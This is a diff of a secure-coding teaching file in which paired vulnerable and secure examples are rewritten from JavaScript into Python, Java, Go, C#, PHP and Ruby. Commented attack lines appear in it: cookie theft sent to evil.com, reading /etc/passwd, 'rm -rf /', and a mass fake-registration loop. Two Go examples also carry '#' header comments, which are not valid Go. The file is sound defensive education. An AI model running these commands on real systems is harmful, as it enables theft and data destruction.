-renderTemplate('Hello {{name}}!', { name: 'Alice' });
-// → "Hello Alice!"
+# GET /greet?name=<script>alert('XSS')</script>
+# Output: <h1>Hello &lt;script&gt;alert('XSS')&lt;/script&gt;!</h1>
+# HTML is auto-escaped by Jinja2
 
-renderTemplate('Hello {{name}}!', {
-  name: '<script>alert("XSS")</script>'
-});
-// → "Hello &lt;script&gt;alert(&quot;XSS&quot;)&lt;/script&gt;!"
-// HTML is escaped — safe to render.`,
-      },
-      {
-        title: "eval() with User Input",
-        vulnerableCode: `// Vulnerable: Using eval() to process user calculations
-function calculate(expression) {
-  // User types "2 + 3" into a calculator field
-  // Developer uses eval for convenience
-  return eval(expression);
-}
-
-// Expected usage:
-// calculate("2 + 3")  → 5
-// calculate("10 * 4") → 40
-
-// Attack:
-// calculate("fetch('https://evil.com/?d='+document.cookie)")
-// → Sends cookies to attacker
-
-// calculate("document.body.innerHTML = '<h1>Hacked</h1>'")
-// → Defaces the page
-
-// Worse — reading local files (Node.js context):
-// calculate("require('fs').readFileSync('/etc/passwd','utf8')")
-// calculate("require('child_process').execSync('rm -rf /')")`,
-        secureCode: `// Secure: Parse and evaluate math safely — no eval()
-function calculate(expression) {
-  // Allowlist: only digits, operators, parentheses, decimals
-  const sanitized = expression.replace(/\\s/g, '');
-
-  if (!/^[\\d+\\-*/().]+$/.test(sanitized)) {
-    throw new Error('Invalid expression');
-  }
-
-  // Use a safe math parser instead of eval
-  return safeMathParse(sanitized);
-}
-
-// Simple recursive descent parser (no eval)
-function safeMathParse(expr) {
-  let pos = 0;
-
-  function parseExpr() {
-    let result = parseTerm();
-    while (pos < expr.length && '+-'.includes(expr[pos])) {
-      const op = expr[pos++];
-      const right = parseTerm();
-      result = op === '+' ? result + right : result - right;
-    }
-    return result;
-  }
-
-  function parseTerm() {
-    let result = parseFactor();
-    while (pos < expr.length && '*/'.includes(expr[pos])) {
-      const op = expr[pos++];
-      const right = parseFactor();
-      result = op === '*' ? result * right : result / right;
-    }
-    return result;
-  }
-
-  function parseFactor() {
-    if (expr[pos] === '(') {
-      pos++; // skip (
-      const result = parseExpr();
-      pos++; // skip )
-      return result;
-    }
-    const start = pos;
-    while (pos < expr.length && /[\\d.]/.test(expr[pos])) pos++;
-    return parseFloat(expr.slice(start, pos));
-  }
-
-  return parseExpr();
-}`,
+# Best practices:
+# 1. Never use f-strings or .format() with templates
+# 2. Always pass user input as template variables
+# 3. Use Jinja2 sandboxed environment for extra safety:
+#    from jinja2.sandbox import SandboxedEnvironment
+#    env = SandboxedEnvironment()
+# 4. Use separate template files (render_template)
+#    instead of render_template_string when possible`,
       },
     ],
   },
@@ -1454,133 +1644,165 @@ function safeMathParse(expr) {
     examples: [
       {
         title: "Unlimited Coupon Abuse",
-        vulnerableCode: `// Vulnerable: No server-side coupon usage tracking
-let cartTotal = 100.00;
+        vulnerableCode: `# Python — Vulnerable: No server-side coupon usage tracking
 
-function applyCoupon(code) {
-  // No check if coupon was already used!
-  if (code === 'SAVE20') {
-    cartTotal -= 20;
-    updateDisplay();
-    return { success: true, message: 'Coupon applied! -$20' };
-  }
-  return { success: false, message: 'Invalid coupon' };
+cart_total = 100.00
+
+def apply_coupon(code):
+    global cart_total
+
+    # No check if coupon was already used!
+    if code == "SAVE20":
+        cart_total -= 20
+        return {"success": True, "message": "Coupon applied! -$20"}
+
+    return {"success": False, "message": "Invalid coupon"}
+
+# User can call apply_coupon("SAVE20") repeatedly:
+# Call 1: $100 → $80
+# Call 2: $80  → $60
+# Call 3: $60  → $40
+# Call 4: $40  → $20
+# Call 5: $20  → $0   ← FREE ITEMS!
+# Call 6: $0   → -$20 ← STORE OWES THE USER!
+
+# This is a DESIGN flaw, not a coding bug.
+# The system was never designed to track coupon usage.`,
+        secureCode: `# Python — Secure: Coupon usage tracking + validation
+
+cart_total = 100.00
+used_coupons = set()
+MINIMUM_TOTAL = 0
+
+COUPONS = {
+    "SAVE20": 20,
+    "SAVE10": 10,
 }
 
-// User can call applyCoupon('SAVE20') repeatedly:
-// Call 1: $100 → $80
-// Call 2: $80  → $60
-// Call 3: $60  → $40
-// Call 4: $40  → $20
-// Call 5: $20  → $0   ← FREE ITEMS!
-// Call 6: $0   → -$20 ← STORE OWES THE USER!`,
-        secureCode: `// Secure: Coupon usage tracking + validation
-let cartTotal = 100.00;
-const usedCoupons = new Set();
-const MINIMUM_TOTAL = 0;
+def apply_coupon(code):
+    global cart_total
 
-function applyCoupon(code) {
-  // Check 1: Has this coupon already been used?
-  if (usedCoupons.has(code)) {
+    # Check 1: Has this coupon already been used?
+    if code in used_coupons:
+        return {
+            "success": False,
+            "message": "Coupon already used in this order."
+        }
+
+    # Check 2: Is the coupon valid?
+    discount = COUPONS.get(code)
+    if not discount:
+        return {"success": False, "message": "Invalid coupon code."}
+
+    # Check 3: Will the total go below minimum?
+    if cart_total - discount < MINIMUM_TOTAL:
+        return {
+            "success": False,
+            "message": "Discount exceeds remaining total."
+        }
+
+    # Apply and record usage
+    cart_total -= discount
+    used_coupons.add(code)
     return {
-      success: false,
-      message: 'Coupon already used in this order.'
-    };
-  }
-
-  // Check 2: Validate the coupon
-  const coupons = { 'SAVE20': 20, 'SAVE10': 10 };
-  const discount = coupons[code];
-  if (!discount) {
-    return { success: false, message: 'Invalid coupon code.' };
-  }
-
-  // Check 3: Ensure total won't go below minimum
-  if (cartTotal - discount < MINIMUM_TOTAL) {
-    return {
-      success: false,
-      message: 'Discount exceeds remaining total.'
-    };
-  }
-
-  // Apply and record usage
-  cartTotal -= discount;
-  usedCoupons.add(code);
-  updateDisplay();
-  return { success: true, message: \`Coupon applied! -$\${discount}\` };
-}`,
+        "success": True,
+        "message": f"Coupon applied! -\${discount}"
+    }`,
       },
       {
         title: "Unrestricted Password Reset",
-        vulnerableCode: `// Vulnerable: Password reset with no rate limit or verification
-app.post('/api/reset-password', (req, res) => {
-  const { email } = req.body;
+        vulnerableCode: `// Java — Vulnerable: Password reset with no rate limit
+@RestController
+public class ResetController {
 
-  // Generate a simple numeric code
-  const code = Math.floor(100000 + Math.random() * 900000);
+    @PostMapping("/api/reset-password")
+    public ResponseEntity<?> requestReset(@RequestBody Map<String, String> body) {
+        String email = body.get("email");
 
-  // Store code with no expiration
-  resetCodes[email] = code;
+        // Generate a simple 6-digit numeric code
+        int code = 100000 + new Random().nextInt(900000);
 
-  sendEmail(email, 'Your reset code: ' + code);
-  res.json({ message: 'Code sent.' });
-});
+        // Store code with no expiration
+        resetCodes.put(email, code);
 
-app.post('/api/verify-reset', (req, res) => {
-  const { email, code, newPassword } = req.body;
+        emailService.send(email, "Your reset code: " + code);
+        return ResponseEntity.ok(Map.of("message", "Code sent."));
+    }
 
-  // No attempt limit! Attacker brute-forces 000000-999999
-  if (resetCodes[email] == code) {
-    users[email].password = newPassword; // No complexity check
-    res.json({ message: 'Password changed!' });
-  }
-});
+    @PostMapping("/api/verify-reset")
+    public ResponseEntity<?> verifyReset(@RequestBody Map<String, String> body) {
+        String email = body.get("email");
+        int code = Integer.parseInt(body.get("code"));
+
+        // No attempt limit! Attacker brute-forces 000000-999999
+        if (resetCodes.containsKey(email)
+                && resetCodes.get(email) == code) {
+            userService.setPassword(email, body.get("newPassword"));
+            return ResponseEntity.ok(Map.of("message", "Password changed!"));
+        }
+        return ResponseEntity.status(400).body(Map.of("error", "Invalid code"));
+    }
+}
 
 // Attacker: 1 million guesses at ~1000/sec = 17 minutes
 // to take over any account.`,
-        secureCode: `// Secure: Rate-limited reset with expiring token
-app.post('/api/reset-password', rateLimit({
-  windowMs: 15 * 60 * 1000, max: 3 // 3 requests per 15 min
-}), async (req, res) => {
-  const { email } = req.body;
+        secureCode: `// Java — Secure: Rate-limited reset with expiring token
+@RestController
+public class ResetController {
 
-  // Generate cryptographically secure token (not numeric)
-  const token = crypto.randomBytes(32).toString('hex');
+    @PostMapping("/api/reset-password")
+    @RateLimiter(name = "reset", fallbackMethod = "rateLimitFallback")
+    public ResponseEntity<?> requestReset(@RequestBody Map<String, String> body) {
+        String email = body.get("email");
 
-  await db.resetTokens.create({
-    email,
-    token: await hashToken(token),
-    expiresAt: new Date(Date.now() + 15 * 60 * 1000), // 15 min
-    attempts: 0
-  });
+        // Generate cryptographically secure token (not numeric)
+        String token = UUID.randomUUID().toString();
 
-  sendEmail(email, \`https://app.com/reset?token=\${token}\`);
-  // Always return success (don't leak if email exists)
-  res.json({ message: 'If the email exists, a link was sent.' });
-});
+        resetTokenRepository.save(new ResetToken(
+            email,
+            hashToken(token),
+            Instant.now().plusSeconds(900),  // 15 min expiry
+            0  // attempt counter
+        ));
 
-app.post('/api/verify-reset', async (req, res) => {
-  const { token, newPassword } = req.body;
+        emailService.send(email,
+            "https://app.com/reset?token=" + token);
 
-  const record = await db.resetTokens.findByHashedToken(token);
-  if (!record || record.expiresAt < new Date()) {
-    return res.status(400).json({ error: 'Invalid or expired' });
-  }
-  if (record.attempts >= 3) {
-    return res.status(429).json({ error: 'Too many attempts' });
-  }
+        // Always return success (don't leak if email exists)
+        return ResponseEntity.ok(
+            Map.of("message", "If the email exists, a link was sent.")
+        );
+    }
 
-  // Enforce password complexity
-  if (!isStrongPassword(newPassword)) {
-    return res.status(400).json({ error: 'Weak password' });
-  }
+    @PostMapping("/api/verify-reset")
+    public ResponseEntity<?> verifyReset(@RequestBody Map<String, String> body) {
+        String token = body.get("token");
+        ResetToken record = resetTokenRepository
+            .findByHashedToken(hashToken(token));
 
-  await changePassword(record.email, newPassword);
-  await db.resetTokens.delete(record.id); // One-time use
-});`,
+        if (record == null || record.isExpired()) {
+            return ResponseEntity.badRequest()
+                .body(Map.of("error", "Invalid or expired"));
+        }
+        if (record.getAttempts() >= 3) {
+            return ResponseEntity.status(429)
+                .body(Map.of("error", "Too many attempts"));
+        }
+        if (!passwordValidator.isStrong(body.get("newPassword"))) {
+            return ResponseEntity.badRequest()
+                .body(Map.of("error", "Weak password"));
+        }
+
+        userService.changePassword(record.getEmail(), body.get("newPassword"));
+        resetTokenRepository.delete(record);  // One-time use
+        return ResponseEntity.ok(Map.of("message", "Password changed."));
+    }
+}`,
       },
       {
         title: "No CAPTCHA on Sensitive Forms",
+        vulnLang: "markup",
+        secureLang: "markup",
         vulnerableCode: `<!-- Vulnerable: Registration form with no bot protection -->
 <form action="/api/register" method="POST">
   <input name="email" type="email" required>
@@ -1592,15 +1814,12 @@ app.post('/api/verify-reset', async (req, res) => {
 
 <!--
   An attacker can script account creation:
-  for (let i = 0; i < 10000; i++) {
-    fetch('/api/register', {
-      method: 'POST',
-      body: JSON.stringify({
-        email: 'spam' + i + '@tempmail.com',
-        password: 'password123'
+
+  for i in range(10000):
+      requests.post('/api/register', json={
+          'email': f'spam{i}@tempmail.com',
+          'password': 'password123'
       })
-    });
-  }
 
   Result:
   - 10,000 fake accounts created instantly
@@ -1624,138 +1843,168 @@ app.post('/api/verify-reset', async (req, res) => {
 </form>
 
 <script>
-  // Server-side validation:
-  app.post('/api/register',
-    rateLimit({ windowMs: 60000, max: 5 }), // 5/minute
-    async (req, res) => {
-      // Check honeypot
-      if (req.body.website) {
-        return res.status(200).json({ ok: true }); // Trick bot
-      }
-
-      // Verify CAPTCHA
-      const score = await verifyCaptcha(req.body.captchaToken);
-      if (score < 0.5) {
-        return res.status(403).json({ error: 'Bot detected' });
-      }
-
-      // Require email verification before activation
-      const user = await createUser(req.body);
-      await sendVerificationEmail(user.email);
-      res.json({ message: 'Check your email to verify.' });
-    }
-  );
+  // Server-side validation (Python Flask):
+  // @app.route('/api/register', methods=['POST'])
+  // @limiter.limit("5 per minute")  # Rate limiting
+  // def register():
+  //     # Check honeypot
+  //     if request.form.get('website'):
+  //         return jsonify(ok=True)  # Trick bots
+  //
+  //     # Verify CAPTCHA
+  //     score = verify_captcha(request.form['captcha_token'])
+  //     if score < 0.5:
+  //         return jsonify(error='Bot detected'), 403
+  //
+  //     # Require email verification before activation
+  //     user = create_user(request.form)
+  //     send_verification_email(user.email)
+  //     return jsonify(message='Check your email to verify.')
 </script>`,
       },
       {
         title: "Predictable Resource Identifiers",
-        vulnerableCode: `// Vulnerable: Sequential/predictable IDs for sensitive data
-function createOrder(userId, items) {
-  const orderId = lastOrderId + 1; // Sequential integer
-  lastOrderId = orderId;
+        vulnerableCode: `// Go — Vulnerable: Sequential IDs for sensitive data
+package main
 
-  return db.orders.create({
-    id: orderId,  // 1001, 1002, 1003...
-    userId,
-    items,
-    invoice: '/invoices/INV-' + orderId + '.pdf'
-  });
+var lastOrderID int64 = 1000
+
+func createOrder(userID string, items []Item) (*Order, error) {
+    lastOrderID++
+    orderID := lastOrderID  // Sequential: 1001, 1002, 1003...
+
+    order := &Order{
+        ID:      orderID,
+        UserID:  userID,
+        Items:   items,
+        Invoice: fmt.Sprintf("/invoices/INV-%d.pdf", orderID),
+    }
+
+    db.Save(order)
+    return order, nil
 }
 
 // Attacker can enumerate:
-// /api/orders/1001 → their order
-// /api/orders/1000 → previous customer's order
-// /api/orders/999  → another customer's order
+// GET /api/orders/1001 → their order
+// GET /api/orders/1000 → previous customer's order
+// GET /api/orders/999  → another customer's order
 // ...
-// /api/orders/1    → first order ever placed
+// GET /api/orders/1    → first order ever placed
 
 // Also reveals business intelligence:
 // "The site has had 1001 orders total"
 // "They get ~50 orders/day based on ID growth"`,
-        secureCode: `// Secure: Unpredictable UUIDs for resource identifiers
-function createOrder(userId, items) {
-  const orderId = crypto.randomUUID();
-  // "f47ac10b-58cc-4372-a567-0e02b2c3d479"
+        secureCode: `// Go — Secure: UUIDs for resource identifiers
+package main
 
-  return db.orders.create({
-    id: orderId,
-    userId,
-    items,
-    invoice: '/invoices/' + orderId + '.pdf'
-  });
+import "github.com/google/uuid"
+
+func createOrder(userID string, items []Item) (*Order, error) {
+    orderID := uuid.New().String()
+    // "f47ac10b-58cc-4372-a567-0e02b2c3d479"
+
+    order := &Order{
+        ID:      orderID,
+        UserID:  userID,
+        Items:   items,
+        Invoice: fmt.Sprintf("/invoices/%s.pdf", orderID),
+    }
+
+    db.Save(order)
+    return order, nil
 }
 
 // Attacker cannot enumerate:
-// /api/orders/f47ac10b-58cc-4372-a567-0e02b2c3d479 → valid
-// /api/orders/f47ac10b-58cc-4372-a567-0e02b2c3d480 → 404
+// GET /api/orders/f47ac10b-...d479 → valid
+// GET /api/orders/f47ac10b-...d480 → 404
 // There are 2^122 possible UUIDs — not brute-forceable.
 
 // Combined with ownership checks (defense in depth):
-app.get('/api/orders/:id', authenticate, async (req, res) => {
-  const order = await db.orders.findById(req.params.id);
-  if (!order || order.userId !== req.user.id) {
-    return res.status(404).json({ error: 'Not found' });
-    // 404 (not 403) — don't reveal if the ID exists
-  }
-  res.json(order);
-});`,
+func getOrder(w http.ResponseWriter, r *http.Request) {
+    orderID := chi.URLParam(r, "id")
+    userID := r.Context().Value("userID").(string)
+
+    order, err := db.FindOrder(orderID)
+    if err != nil || order.UserID != userID {
+        // 404 (not 403) — don't reveal if the ID exists
+        http.Error(w, "Not found", http.StatusNotFound)
+        return
+    }
+    json.NewEncoder(w).Encode(order)
+}`,
       },
       {
         title: "No Re-authentication for Sensitive Actions",
-        vulnerableCode: `// Vulnerable: Critical actions use only the session cookie
-app.post('/api/account/change-email', authenticate, (req, res) => {
-  // Only checks if user is logged in — no re-auth!
-  const { newEmail } = req.body;
-  db.users.update(req.user.id, { email: newEmail });
-  res.json({ message: 'Email changed.' });
-});
+        vulnerableCode: `// C# ASP.NET — Vulnerable: No re-auth for critical actions
+[Authorize]
+[ApiController]
+[Route("api/account")]
+public class AccountController : ControllerBase
+{
+    [HttpPost("change-email")]
+    public IActionResult ChangeEmail([FromBody] ChangeEmailDto dto)
+    {
+        // Only checks if user is logged in — no re-auth!
+        var userId = User.FindFirst(ClaimTypes.NameIdentifier)?.Value;
+        _userService.UpdateEmail(userId, dto.NewEmail);
+        return Ok(new { message = "Email changed." });
+    }
 
-app.post('/api/account/change-password', authenticate, (req, res) => {
-  // Doesn't ask for current password!
-  const { newPassword } = req.body;
-  db.users.update(req.user.id, { password: newPassword });
-  res.json({ message: 'Password changed.' });
-});
+    [HttpPost("change-password")]
+    public IActionResult ChangePassword([FromBody] ChangePasswordDto dto)
+    {
+        // Doesn't ask for current password!
+        var userId = User.FindFirst(ClaimTypes.NameIdentifier)?.Value;
+        _userService.UpdatePassword(userId, dto.NewPassword);
+        return Ok(new { message = "Password changed." });
+    }
+}
 
 // If an attacker steals the session (XSS, shared computer):
 // 1. Change email to attacker@evil.com
 // 2. Change password to anything
-// 3. Original user is permanently locked out
-// 4. Attacker owns the account`,
-        secureCode: `// Secure: Re-authenticate before sensitive actions
-app.post('/api/account/change-email',
-  authenticate,
-  async (req, res) => {
-    const { newEmail, currentPassword } = req.body;
+// 3. Original user is permanently locked out`,
+        secureCode: `// C# ASP.NET — Secure: Re-authenticate for sensitive actions
+[Authorize]
+[ApiController]
+[Route("api/account")]
+public class AccountController : ControllerBase
+{
+    [HttpPost("change-email")]
+    public async Task<IActionResult> ChangeEmail(
+        [FromBody] ChangeEmailDto dto)
+    {
+        var userId = User.FindFirst(ClaimTypes.NameIdentifier)?.Value;
+        var user = await _userService.FindById(userId);
 
-    // Require current password for sensitive changes
-    const isValid = await verifyPassword(
-      currentPassword, req.user.passwordHash
-    );
-    if (!isValid) {
-      return res.status(403).json({
-        error: 'Current password required.'
-      });
+        // Require current password for sensitive changes
+        if (!await _userService.VerifyPassword(
+                user, dto.CurrentPassword))
+        {
+            return StatusCode(403, new {
+                error = "Current password required."
+            });
+        }
+
+        // Send confirmation to BOTH old and new email
+        var token = Guid.NewGuid().ToString();
+        await _emailChangeService.Create(new EmailChange {
+            UserId = userId,
+            NewEmail = dto.NewEmail,
+            Token = HashToken(token),
+            ExpiresAt = DateTime.UtcNow.AddHours(1)
+        });
+
+        await _emailService.Send(user.Email,
+            "Someone requested an email change for your account.");
+        await _emailService.Send(dto.NewEmail,
+            $"Confirm your new email: .../confirm?token={token}");
+
+        return Ok(new {
+            message = "Confirmation sent to new email."
+        });
     }
-
-    // Verify new email via confirmation link
-    const token = crypto.randomBytes(32).toString('hex');
-    await db.emailChanges.create({
-      userId: req.user.id,
-      newEmail,
-      token: await hashToken(token),
-      expiresAt: new Date(Date.now() + 3600000)
-    });
-
-    // Send confirmation to BOTH old and new email
-    await sendEmail(req.user.email,
-      'Someone requested an email change for your account.');
-    await sendEmail(newEmail,
-      \`Confirm your new email: .../confirm?token=\${token}\`);
-
-    res.json({ message: 'Confirmation sent to new email.' });
-  }
-);`,
+}`,
       },
     ],
   },
@@ -1784,7 +2033,7 @@ app.post('/api/account/change-email',
     examples: [
       {
         title: "No Rate Limiting / Brute Force",
-        vulnerableCode: `// Vulnerable: No rate limiting or lockout
+        vulnerableCode: `// JavaScript — Vulnerable: No rate limiting or lockout
 const users = { admin: 'dragon' };
 
 function login(username, password) {
@@ -1809,7 +2058,7 @@ commonPasswords.forEach(pw => {
     console.log('CRACKED! Password is: ' + pw);
   }
 });`,
-        secureCode: `// Secure: Rate limiting + account lockout
+        secureCode: `// JavaScript — Secure: Rate limiting + account lockout
 const users = { admin: 'dragon' };
 const attempts = {};
 const MAX_ATTEMPTS = 3;
@@ -1854,252 +2103,305 @@ function login(username, password) {
       },
       {
         title: "Weak Password Policy",
-        vulnerableCode: `// Vulnerable: No password requirements
-function register(username, password) {
-  // Accepts ANY password — even empty strings
-  if (!username || !password) {
-    return { error: 'Username and password required.' };
-  }
+        vulnerableCode: `# Ruby on Rails — Vulnerable: No password requirements
+class User < ApplicationRecord
+  # No password validation at all!
+  has_secure_password
 
-  // These all work:
-  // register('admin', '1')            → 1 character
-  // register('admin', 'password')     → most common password
-  // register('admin', 'admin')        → same as username
-  // register('admin', '123456')       → in every breach list
-  // register('admin', 'aaa')          → no complexity at all
+  validates :username, presence: true, uniqueness: true
+  # No validates :password
 
-  db.users.create({ username, password });
-  return { success: true };
-}
+  # These all work:
+  # User.create(username: 'admin', password: '1')
+  # User.create(username: 'admin', password: 'password')
+  # User.create(username: 'admin', password: 'admin')
+  # User.create(username: 'admin', password: '123456')
+  # User.create(username: 'admin', password: 'aaa')
+end
 
-// With no policy, 81% of breaches involve weak passwords.
-// Credential stuffing uses leaked password lists
-// that are 99% effective against weak-policy sites.`,
-        secureCode: `// Secure: Comprehensive password policy
-const COMMON_PASSWORDS = new Set(
-  // Load top 100,000 breached passwords
-  require('./common-passwords.json')
-);
+# With no policy, 81% of breaches involve weak passwords.
+# Credential stuffing uses leaked password lists
+# that are 99% effective against weak-policy sites.`,
+        secureCode: `# Ruby on Rails — Secure: Comprehensive password policy
+class User < ApplicationRecord
+  has_secure_password
 
-function validatePassword(password, username) {
-  const errors = [];
+  validates :username, presence: true, uniqueness: true
 
-  if (password.length < 12) {
-    errors.push('Minimum 12 characters required.');
-  }
-  if (password.length > 128) {
-    errors.push('Maximum 128 characters.');
-  }
-  if (password.toLowerCase().includes(username.toLowerCase())) {
-    errors.push('Password cannot contain your username.');
-  }
-  if (COMMON_PASSWORDS.has(password.toLowerCase())) {
-    errors.push('This password is too common (in breach lists).');
-  }
-  if (!/[a-z]/.test(password) || !/[A-Z]/.test(password)) {
-    errors.push('Include both uppercase and lowercase letters.');
-  }
-  if (!/\\d/.test(password)) {
-    errors.push('Include at least one number.');
-  }
+  validates :password,
+    length: { minimum: 12, maximum: 128 },
+    format: {
+      with: /(?=.*[a-z])(?=.*[A-Z])(?=.*\\d)/,
+      message: "must include uppercase, lowercase, and a number"
+    }
 
-  return { valid: errors.length === 0, errors };
-}
+  validate :password_not_common
+  validate :password_not_contains_username
 
-function register(username, password) {
-  const validation = validatePassword(password, username);
-  if (!validation.valid) {
-    return { error: validation.errors };
-  }
-  const hashed = await bcrypt.hash(password, 12);
-  db.users.create({ username, password: hashed });
-  return { success: true };
-}`,
+  private
+
+  COMMON_PASSWORDS = File.readlines(
+    Rails.root.join("config", "common_passwords.txt")
+  ).map(&:strip).to_set.freeze
+
+  def password_not_common
+    if password.present? && COMMON_PASSWORDS.include?(password.downcase)
+      errors.add(:password, "is too common (found in breach lists)")
+    end
+  end
+
+  def password_not_contains_username
+    if password.present? && username.present? &&
+       password.downcase.include?(username.downcase)
+      errors.add(:password, "cannot contain your username")
+    end
+  end
+end
+
+# User.create(username: 'admin', password: '1') → REJECTED
+# User.create(username: 'admin', password: 'Str0ngP@ss2024!') → OK`,
       },
       {
         title: "Session Fixation",
-        vulnerableCode: `// Vulnerable: Session ID not regenerated after login
-app.post('/login', (req, res) => {
-  const { username, password } = req.body;
-  const user = authenticate(username, password);
+        vulnerableCode: `<?php
+// PHP — Vulnerable: Session ID not regenerated after login
 
-  if (user) {
-    // Reuses the EXISTING session ID
-    req.session.userId = user.id;
-    req.session.role = user.role;
-    res.json({ success: true });
-  }
-});
+session_start();
+
+if ($_SERVER['REQUEST_METHOD'] === 'POST') {
+    $username = $_POST['username'];
+    $password = $_POST['password'];
+
+    $user = authenticate($username, $password);
+
+    if ($user) {
+        // Reuses the EXISTING session ID — not regenerated!
+        $_SESSION['user_id'] = $user['id'];
+        $_SESSION['role'] = $user['role'];
+        header('Location: /dashboard');
+        exit;
+    }
+}
 
 // Attack scenario:
 // 1. Attacker visits the site → gets session ID "abc123"
 // 2. Attacker sends victim a link:
-//    https://app.com/login?sessionId=abc123
+//    https://app.com/login?PHPSESSID=abc123
 // 3. Victim clicks link, logs in
 // 4. Victim's session uses ID "abc123" (not regenerated)
 // 5. Attacker already knows session ID "abc123"
-// 6. Attacker uses "abc123" → is now logged in as victim`,
-        secureCode: `// Secure: Regenerate session ID on login
-app.post('/login', (req, res) => {
-  const { username, password } = req.body;
-  const user = authenticate(username, password);
+// 6. Attacker uses "abc123" → is now logged in as victim
+?>`,
+        secureCode: `<?php
+// PHP — Secure: Regenerate session ID on login
 
-  if (user) {
-    // Destroy the old session and create a new one
-    const oldSession = req.session;
-    req.session.regenerate((err) => {
-      if (err) {
-        return res.status(500).json({ error: 'Session error' });
-      }
-      // Copy non-sensitive data to new session
-      req.session.userId = user.id;
-      req.session.role = user.role;
-      req.session.createdAt = Date.now();
+session_start();
 
-      // Secure cookie settings
-      req.session.cookie.secure = true;    // HTTPS only
-      req.session.cookie.httpOnly = true;  // No JS access
-      req.session.cookie.sameSite = 'strict';
-      req.session.cookie.maxAge = 3600000; // 1 hour
+// Configure secure session settings
+ini_set('session.cookie_httponly', 1);  // No JS access
+ini_set('session.cookie_secure', 1);    // HTTPS only
+ini_set('session.cookie_samesite', 'Strict');
+ini_set('session.use_strict_mode', 1);  // Reject unknown IDs
 
-      res.json({ success: true });
-    });
-  }
-});
+if ($_SERVER['REQUEST_METHOD'] === 'POST') {
+    $username = $_POST['username'];
+    $password = $_POST['password'];
+
+    $user = authenticate($username, $password);
+
+    if ($user) {
+        // CRITICAL: Destroy old session and create a new one
+        session_regenerate_id(true);  // true = delete old session
+
+        $_SESSION['user_id'] = $user['id'];
+        $_SESSION['role'] = $user['role'];
+        $_SESSION['created_at'] = time();
+        $_SESSION['ip'] = $_SERVER['REMOTE_ADDR'];
+
+        // Set session lifetime (1 hour)
+        $_SESSION['expires_at'] = time() + 3600;
+
+        header('Location: /dashboard');
+        exit;
+    }
+}
+
+// On every request, check session validity:
+// if ($_SESSION['expires_at'] < time()) {
+//     session_destroy();
+//     header('Location: /login');
+// }
 
 // Old session ID "abc123" is invalidated.
 // New session ID "xyz789" is generated.
-// Attacker's "abc123" is useless.`,
+// Attacker's "abc123" is useless.
+?>`,
       },
       {
         title: "No Multi-Factor Authentication",
-        vulnerableCode: `// Vulnerable: Single-factor (password only) login
-app.post('/login', async (req, res) => {
-  const { email, password } = req.body;
-  const user = await db.users.findByEmail(email);
+        vulnerableCode: `# Go — Vulnerable: Single-factor (password only) login
+package main
 
-  if (user && await verifyPassword(password, user.hash)) {
+func loginHandler(w http.ResponseWriter, r *http.Request) {
+    var creds struct {
+        Email    string \`json:"email"\`
+        Password string \`json:"password"\`
+    }
+    json.NewDecoder(r.Body).Decode(&creds)
+
+    user, err := db.FindUserByEmail(creds.Email)
+    if err != nil {
+        http.Error(w, "Invalid credentials", 401)
+        return
+    }
+
+    if bcrypt.CompareHashAndPassword(
+        []byte(user.PasswordHash), []byte(creds.Password),
+    ) != nil {
+        http.Error(w, "Invalid credentials", 401)
+        return
+    }
+
     // Immediately grants full access with just a password
-    const token = generateSessionToken();
-    res.json({ token, user: { id: user.id, name: user.name } });
-  } else {
-    res.status(401).json({ error: 'Invalid credentials' });
-  }
-});
+    token := generateSessionToken(user)
+    json.NewEncoder(w).Encode(map[string]string{"token": token})
+}
 
 // A compromised password = full account takeover
 // Passwords can be stolen via:
 // - Phishing emails
 // - Data breaches (password reuse)
 // - Keyloggers / malware
-// - Shoulder surfing
-// - Social engineering
-// Once stolen, nothing stops the attacker.`,
-        secureCode: `// Secure: TOTP-based Multi-Factor Authentication
-app.post('/login', async (req, res) => {
-  const { email, password } = req.body;
-  const user = await db.users.findByEmail(email);
+// - Social engineering`,
+        secureCode: `# Go — Secure: TOTP-based Multi-Factor Authentication
+package main
 
-  if (!user || !await verifyPassword(password, user.hash)) {
-    return res.status(401).json({ error: 'Invalid credentials' });
-  }
+import "github.com/pquerna/otp/totp"
 
-  // If MFA is enabled, require second factor
-  if (user.mfaEnabled) {
-    const challenge = crypto.randomBytes(32).toString('hex');
-    await db.mfaChallenges.create({
-      userId: user.id,
-      challenge,
-      expiresAt: new Date(Date.now() + 300000) // 5 min
-    });
-    return res.json({ requiresMFA: true, challenge });
-  }
+func loginHandler(w http.ResponseWriter, r *http.Request) {
+    var creds struct {
+        Email    string \`json:"email"\`
+        Password string \`json:"password"\`
+    }
+    json.NewDecoder(r.Body).Decode(&creds)
 
-  issueSession(user, res);
-});
+    user, err := db.FindUserByEmail(creds.Email)
+    if err != nil || bcrypt.CompareHashAndPassword(
+        []byte(user.PasswordHash), []byte(creds.Password)) != nil {
+        http.Error(w, "Invalid credentials", 401)
+        return
+    }
 
-app.post('/login/mfa', async (req, res) => {
-  const { challenge, totpCode } = req.body;
-  const record = await db.mfaChallenges.findValid(challenge);
-  if (!record) {
-    return res.status(401).json({ error: 'Invalid challenge' });
-  }
+    // If MFA is enabled, require second factor
+    if user.MFAEnabled {
+        challenge := generateSecureToken(32)
+        db.SaveMFAChallenge(user.ID, challenge, time.Now().Add(5*time.Minute))
+        json.NewEncoder(w).Encode(map[string]interface{}{
+            "requiresMFA": true,
+            "challenge":   challenge,
+        })
+        return
+    }
+    issueSession(w, user)
+}
 
-  const user = await db.users.findById(record.userId);
-  // Verify TOTP code (time-based one-time password)
-  const isValid = verifyTOTP(user.mfaSecret, totpCode);
+func mfaVerifyHandler(w http.ResponseWriter, r *http.Request) {
+    var req struct {
+        Challenge string \`json:"challenge"\`
+        TOTPCode  string \`json:"totpCode"\`
+    }
+    json.NewDecoder(r.Body).Decode(&req)
 
-  if (!isValid) {
-    return res.status(401).json({ error: 'Invalid MFA code' });
-  }
+    record, err := db.FindValidMFAChallenge(req.Challenge)
+    if err != nil {
+        http.Error(w, "Invalid challenge", 401)
+        return
+    }
 
-  await db.mfaChallenges.delete(record.id);
-  issueSession(user, res);
-});`,
+    user, _ := db.FindUserByID(record.UserID)
+
+    // Verify TOTP code (time-based one-time password)
+    if !totp.Validate(req.TOTPCode, user.MFASecret) {
+        http.Error(w, "Invalid MFA code", 401)
+        return
+    }
+
+    db.DeleteMFAChallenge(record.ID)
+    issueSession(w, user)
+}`,
       },
       {
         title: "Insecure Password Recovery",
-        vulnerableCode: `// Vulnerable: Security questions for password recovery
-app.post('/api/recover', (req, res) => {
-  const { email, mothersMaidenName, petName } = req.body;
